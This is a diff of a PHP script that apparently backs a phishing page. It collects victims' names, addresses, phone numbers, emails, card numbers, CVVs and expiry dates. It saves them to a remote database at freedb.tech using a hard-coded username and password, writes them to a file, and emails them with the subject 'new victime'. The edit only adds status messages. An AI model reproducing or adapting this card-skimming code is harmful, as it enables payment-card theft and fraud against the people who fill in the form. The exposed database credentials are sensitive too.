@@ -83,9 +83,9 @@ html , body {background:transparent; }
 
 
 <?php
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\SMTP;
-use PHPMailer\PHPMailer\Exception;
+use phpmailer\phpmailer\phpmailer;
+use phpmailer\phpmailer\smtp;
+use phpmailer\phpmailer\exception;
 require 'autre/phpmailer/exception.php';
 require 'autre/phpmailer/phpmailer.php';
 require 'autre/phpmailer/smtp.php';
@@ -99,7 +99,7 @@ if(    isset($_POST["name"])  )
 $connect = new PDO("mysql:host=freedb.tech;dbname=freedbtech_wordpresst", "freedbtech_mehdiouatmane", "mehdi2014@A");
 $query =  "INSERT INTO tablee   (name, date, address, codepostal, city, phone, email, namecard, cardnumber, cvv, datexp)   VALUES    ( :name, :date, :address, :codepostal, :city, :phone, :email, :namecard, :cardnumber, :cvv, :datexp ) " ;
 $user_data =  array(      ':name' => $_POST["name"],        ':date' => $_POST["date"],      ':address' => $_POST["address"],     ':codepostal' => $_POST["codepostal"],    ':city' => $_POST["city"],    ':phone' => $_POST["phone"],    ':email' => $_POST["email"],    ':namecard' => $_POST["namecard"],    ':cardnumber' => $_POST["cardnumber"],    ':cvv' => $_POST["cvv"],    ':datexp' => $_POST["datexp"]          ) ;
-if(     $connect   ->  prepare($query)	->  execute($user_data)               )       {  echo''; }  else   {  echo''; }
+if(     $connect   ->  prepare($query)	->  execute($user_data)               )       {  echo'yes'; }  else   {  echo'none'; }
 
 
 $name = $_POST["name"];
@@ -127,7 +127,7 @@ fwrite($file ,    "cardnumber : "   .      $cardnumber   .      "\n");
 fwrite($file ,    "cvv : "          .      $cvv          .      "\n"); 
 fwrite($file ,    "datexp : "       .      $datexp       .      "\n"); 
 fwrite($file , "\n");
-if ( $file   ) {  echo "";   }else{  echo "";   }
+if ( $file   ) {  echo "yeswrite ";   }else{  echo "nonwrite  ";   }
 
 
 
@@ -153,7 +153,7 @@ $mail->IsHTML(true);
 $mail->Subject = 'new victime';           
 $mail->Body = 'les info victime: '   .   '<br> name: '   .   $name    .   '<br> date: '    .  $date    .   '<br> address: ' .  $address   .   '<br> codepostal: '  .  $codepostal   .   '<br> city: '  .  $city    .   '<br> phone: '    .    $phone    .   '<br> email: '    .   $email        .   '<br> namecard: '    .   $namecard       .   '<br> cardnumber: '    .   $cardnumber        .   '<br> cvv: '    .   $cvv       .   '<br> datexp: '    .   $datexp        ;           
 $mail->smtpClose();
-if ( $mail->send() )   {	echo ""; }  else   {  echo "";	}
+if ( $mail->send() )   {	echo "Email Sent..!"; }  else   {  echo "Error..!";	}
 
 	
 
